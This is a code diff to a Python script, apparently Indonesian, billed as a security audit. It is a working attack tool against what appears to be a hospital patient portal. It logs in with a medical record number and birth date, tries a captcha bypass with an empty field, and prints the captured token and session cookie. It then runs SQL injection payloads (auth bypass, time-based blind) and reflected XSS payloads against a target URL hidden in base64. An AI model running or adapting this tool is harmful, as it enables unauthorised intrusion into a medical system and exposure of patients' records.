@@ -46,14 +46,17 @@ lock = threading.Lock()
 hasil_data = []
 total_checked = 0
 total_to_scan = 0
+last_token = "N/A"
 
 def login():
+    global last_token
     print("[*] Initiating Security Audit: Captcha Bypass Testing...")
     try:
         get_page = session.get(URL_HAL_LOGIN)
         soup_login = BeautifulSoup(get_page.text, 'html.parser')
         input_t = soup_login.find('input', {'name': 't'})
         token_t = input_t.get('value') if input_t else ""
+        last_token = token_t
 
         # Bypass Captcha Testing: Sending empty string to 'c' parameter
         payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
@@ -299,58 +302,100 @@ def parameter_discovery_audit():
         print(f"[!] Discovery Error: {str(e)}")
 
 def vulnerability_audit():
-    # [*] Automated Audit: Injection Discovery
-    print(f"\n{_decode('WypdIEF1dG9tYXRlZCBBdWRpdDogSW5qZWN0aW9uIERpc2NvdmVyeQ==')}")
+    ts_init = time.strftime("%H:%M:%S")
+    print(f"\n\033[92m" + "="*85)
+    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] BLORAHAT PROFESSIONAL VULNERABILITY SCANNER")
+    print("="*85 + "\033[0m")
+    
+    cookies = session.cookies.get_dict()
+    session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or "Not Found"
     base_url = BASE_TARGET_URL + NO_RM
     
-    # --- SQL Injection Test ---
-    sqli_tests = [
-        ("'", _decode('RXJyb3ItQmFzZWQ=')), 
-        ("' OR 1=1--", _decode('QXV0aC1CeXBhc3M=')),
-        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", _decode('VGltZS1CYXNlZCBCbGluZA=='))
-    ]
-    
-    print(f"\n[+] {_decode('QXVkaXRpbmcgU1FMIEluamVjdGlvbiBTdXJmYWNl...')}")
-    for payload, method in sqli_tests:
-        try:
-            s_time = time.time()
-            res = session.get(base_url + payload, timeout=10)
-            e_time = time.time() - s_time
-            
-            # Time-based detection
-            if _decode('U0xFRVA=') in payload and e_time >= 5:
-                print(f" [\033[91m!\033[0m] {_decode('VlVMTkVSQUJMRQ==')}: SQLi {method}")
-                print(f"     URL: {base_url + payload}\n     Method: {method}")
-            # Error-based detection
-            elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
-                print(f" [\033[91m!\033[0m] {_decode('VlVMTkVSQUJMRQ==')}: SQLi {method}")
-                print(f"     URL: {base_url + payload}\n     Payload: {payload}")
-        except: pass
+    print(f"[*] Inisialisasi Scan  : {ts_init}")
+    print(f"[*] Target URL         : {BASE_TARGET_URL}{NO_RM}")
+    print(f"[*] Captured Token     : {last_token}")
+    print(f"[*] Session ID         : {session_id}")
+    print("-" * 85)
 
-    # --- XSS Test ---
-    xss_payloads = ["<script>alert(1)</script>", "<svg/onload=alert(1)>"]
+    findings = []
+    
+    # 1. SQL Injection Testing
+    print(f"\n[+] Memulai Audit: SQL Injection (Error & Time Based)")
+    sqli_payloads = [
+        ("'", "Error-Based SQLi"),
+        ("' OR 1=1--", "Boolean-Based Bypass"),
+        ("admin'--", "Authentication Bypass"),
+        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "Time-Based Blind SQLi")
+    ]
+
+    for payload, method in sqli_payloads:
+        ts = time.strftime("%H:%M:%S")
+        test_url = base_url + payload
+        try:
+            start_t = time.time()
+            res = session.get(test_url, timeout=10)
+            elapsed = time.time() - start_t
+            
+            is_vuln = False
+            if _decode('U0xFRVA=') in payload and elapsed >= 5:
+                is_vuln = True
+            elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
+                is_vuln = True
+            
+            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+            print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
+            
+            if is_vuln:
+                findings.append({"type": "SQL Injection", "severity": "HIGH", "loc": "/reservasi_dokter/tambah/", "method": method})
+        except:
+            print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
+
+    # 2. XSS Testing
+    print(f"\n[+] Memulai Audit: Reflected Cross-Site Scripting (XSS)")
+    xss_payloads = [
+        ("<script>alert(1)</script>", "Basic Script Injection"),
+        ("<svg/onload=alert(1)>", "SVG Animation Injection"),
+        ("\"><script>alert(1)</script>", "Attribute Escape Injection"),
+        ("'-alert(1)-'", "JavaScript Context Injection")
+    ]
     search_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jpd2F5YXRfcGVtZXJpa3NhYW4/c2VhcmNoPQ==")
     
-    print(f"\n[+] {_decode('QXVkaXRpbmcgUmVmbGVjdGVkIFhTUyBTdXJmYWNl...')}")
-    for pay in xss_payloads:
+    for payload in xss_payloads:
+        ts = time.strftime("%H:%M:%S")
         try:
-            res = session.get(search_url + pay, timeout=10)
-            if pay in res.text:
-                print(f" [\033[91m!\033[0m] {_decode('VlVMTkVSQUJMRQ==')}: Reflected XSS")
-                print(f"     URL: {search_url + pay}\n     Payload: {pay}")
-        except: pass
+            res = session.get(search_url + payload, timeout=10)
+            is_vuln = payload in res.text
+            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+            print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
+            
+            if is_vuln:
+                findings.append({"type": "Reflected XSS", "severity": "MEDIUM", "loc": "/riwayat_pemeriksaan/search", "method": "Script Reflection"})
+        except:
+            print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
 
-    # --- Stored XSS Mapping ---
-    print(f"\n[+] {_decode('TWFwcGluZyBTdG9yZWQgWFNTIEF0dGFjayBTdXJmYWNl...')}")
-    try:
-        res = session.get(base_url, timeout=10)
-        soup = BeautifulSoup(res.text, 'html.parser')
-        for form in soup.find_all('form'):
-            for inp in form.find_all(['input', 'textarea']):
-                name = inp.get('name')
-                if name and (inp.name == 'textarea' or inp.get('type') == 'text'):
-                    print(f" [\033[93m!\033[0m] {_decode('UG90ZW50aWFsIFZlY3Rvcg==')}: {name} (Stored XSS Path)")
-    except: pass
+    # Tabel Ringkasan (Summary Report)
+    print(f"\n" + "-"*85)
+    print(f"{' '*32}\033[1mSUMMARY REPORT\033[0m")
+    print("-"*85)
+    print(f"{'Vulnerability Found':<25} | {'Severity':<10} | {'Location'}")
+    print("-"*85)
+    
+    if not findings:
+        print(f"{' '*30}Tidak ditemukan kerentanan kritikal.")
+    else:
+        for f in findings:
+            print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc']}")
+    
+    print("-"*85)
+    total_vuln = len(findings)
+    max_severity = "LOW"
+    if any(f['severity'] == "HIGH" for f in findings): max_severity = "HIGH"
+    elif any(f['severity'] == "MEDIUM" for f in findings): max_severity = "MEDIUM"
+    
+    print(f"[*] Total Vulnerabilities Found : {total_vuln}")
+    print(f"[*] Overall Severity Level      : \033[91m{max_severity}\033[0m" if max_severity != "LOW" else f"[*] Overall Severity Level      : {max_severity}")
+    print(f"[*] Fix Suggestion              : Gunakan Prepared Statements (PDO) & Sanitize Input (HTML Purifier)")
+    print("="*85 + "\n")
 
 def start_process(id_list):
     global total_checked, total_to_scan
